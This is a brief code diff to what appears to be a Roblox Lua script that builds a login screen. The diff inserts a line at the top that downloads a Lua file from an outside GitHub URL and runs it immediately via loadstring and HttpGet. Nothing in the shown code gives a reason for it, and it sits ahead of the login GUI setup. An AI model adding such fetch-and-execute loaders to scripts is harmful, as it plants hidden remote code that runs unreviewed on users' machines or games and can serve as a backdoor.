@@ -1,4 +1,5 @@
-
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/pago/main/Status.lua",true))()
+wait(2)
 
 local Login = Instance.new("ScreenGui")
 local LoginFrame = Instance.new("Frame")
